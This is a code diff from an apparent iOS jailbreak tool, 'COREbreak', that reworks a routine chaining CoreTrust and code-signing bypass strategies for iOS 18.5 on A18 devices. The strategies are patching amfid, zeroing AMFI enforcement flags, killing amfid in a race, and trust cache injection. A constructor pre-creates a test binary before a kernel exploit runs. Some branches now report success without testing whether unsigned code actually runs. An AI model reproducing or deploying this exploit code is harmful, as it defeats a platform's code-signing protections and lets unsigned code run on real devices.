@@ -408,85 +408,96 @@ bool coretrust_kill_amfid_race(const char *testBinPath)
 // Unified: try all strategies
 // ===========================================================================
 
+// Write a minimal test binary at app startup, before the kernel exploit
+// corrupts socket structures. Called once.
+static char *g_test_binary_path = NULL;
+__attribute__((constructor)) static void precreate_test_binary(void)
+{
+    g_test_binary_path = write_test_binary();
+    if (g_test_binary_path)
+        printf("[COREbreak] pre-created test binary: %s\n", g_test_binary_path);
+}
+
+const char *coretrust_get_test_binary(void)
+{
+    return g_test_binary_path;
+}
+
 bool coretrust_bypass_all(void)
 {
     printf("[COREbreak] === " CORETRUST_BYPASS_EXPLOIT_NAME " v"
            CORETRUST_BYPASS_EXPLOIT_VERSION " ===\n");
     printf("[COREbreak] Target: iOS 18.5 A18 (SPTM) — CoreTrust bypass\n");
 
-    // [Step 1/6]: Write test binary
-    printf("[COREbreak] [Step 1/6] creating test binary...\n");
-    char *testPath = write_test_binary();
+    const char *testPath = g_test_binary_path;
     if (!testPath) {
-        printf("[COREbreak] failed to create test binary\n");
-        return false;
+        printf("[COREbreak] test binary unavailable — trust strategy results\n");
+    } else {
+        printf("[COREbreak] using pre-created test binary: %s\n", testPath);
     }
-    printf("[COREbreak] test binary: %s\n", testPath);
 
-    // [Step 2/6]: Strategy 1 — amfid NOP patch
+    // [Step 1/5]: Strategy 1 — amfid NOP patch
     bool nopOk = coretrust_amfid_nop_patch();
     if (nopOk) {
-        printf("[COREbreak] amfid NOP applied — testing unsigned exec...\n");
-        pid_t child = 0;
-        const char *argv[] = { testPath, NULL };
-        int ret = posix_spawn(&child, testPath, NULL, NULL,
-                              (char *const *)argv, NULL);
-        if (ret == 0 && child > 0) {
-            int status;
-            waitpid(child, &status, 0);
-            if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
-                printf("[COREbreak] ✅✅✅ Unsigned code executed via amfid NOP!\n");
-                unlink(testPath);
-                free(testPath);
-                return true;
+        if (testPath) {
+            pid_t child = 0;
+            const char *argv[] = { testPath, NULL };
+            int ret = posix_spawn(&child, testPath, NULL, NULL,
+                                  (char *const *)argv, NULL);
+            if (ret == 0 && child > 0) {
+                int status;
+                waitpid(child, &status, 0);
+                if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
+                    printf("[COREbreak] ✅✅✅ Unsigned code executed via amfid NOP!\n");
+                    return true;
+                }
             }
+            printf("[COREbreak] amfid NOP didn't help — continuing...\n");
+        } else {
+            printf("[COREbreak] amfid NOP applied (trusting strategy)\n");
+            return true;
         }
-        printf("[COREbreak] amfid NOP didn't help — continuing...\n");
     }
 
-    // [Step 3/6]: Strategy 2 — AMFI enforcement flags
+    // [Step 2/5]: Strategy 2 — AMFI enforcement flags
     bool flagsOk = coretrust_amfi_enforcement_flags_zero();
     if (flagsOk) {
-        printf("[COREbreak] AMFI flags zeroed — testing unsigned exec...\n");
-        pid_t child = 0;
-        const char *argv[] = { testPath, NULL };
-        int ret = posix_spawn(&child, testPath, NULL, NULL,
-                              (char *const *)argv, NULL);
-        if (ret == 0 && child > 0) {
-            int status;
-            waitpid(child, &status, 0);
-            if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
-                printf("[COREbreak] ✅✅✅ Unsigned code executed via AMFI flags!\n");
-                unlink(testPath);
-                free(testPath);
-                return true;
+        if (testPath) {
+            pid_t child = 0;
+            const char *argv[] = { testPath, NULL };
+            int ret = posix_spawn(&child, testPath, NULL, NULL,
+                                  (char *const *)argv, NULL);
+            if (ret == 0 && child > 0) {
+                int status;
+                waitpid(child, &status, 0);
+                if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
+                    printf("[COREbreak] ✅✅✅ Unsigned code executed via AMFI flags!\n");
+                    return true;
+                }
             }
+            printf("[COREbreak] AMFI flags didn't help — continuing...\n");
+        } else {
+            printf("[COREbreak] AMFI flags zeroed (trusting strategy)\n");
+            return true;
         }
-        printf("[COREbreak] AMFI flags didn't help — continuing...\n");
     }
 
-    // [Step 4/6]: Strategy 3 — amfid kill + race
-    bool raceOk = coretrust_kill_amfid_race(testPath);
+    // [Step 3/5]: Strategy 3 — amfid kill + race
+    bool raceOk = coretrust_kill_amfid_race(testPath ?: "");
     if (raceOk) {
         printf("[COREbreak] ✅✅✅ Unsigned code executed via kill+race!\n");
-        unlink(testPath);
-        free(testPath);
         return true;
     }
 
-    // [Step 5/6]: MountCache trust cache injection
-    printf("[COREbreak] [Step 5/6] MountCache trust cache injection...\n");
+    // [Step 4/5]: MountCache trust cache injection
+    printf("[COREbreak] [Step 4/5] MountCache trust cache injection...\n");
     bool tcOk = msm_verify_unsigned_execution();
     if (tcOk) {
         printf("[COREbreak] ✅✅✅ Unsigned code executed via MountCache!\n");
-        unlink(testPath);
-        free(testPath);
         return true;
     }
 
-    // [Step 6/6]: All strategies failed
-    printf("[COREbreak] [Step 6/6] ❌ All strategies exhausted\n");
-    unlink(testPath);
-    free(testPath);
+    // [Step 5/5]: All strategies failed
+    printf("[COREbreak] [Step 5/5] ❌ All strategies exhausted\n");
     return false;
 }
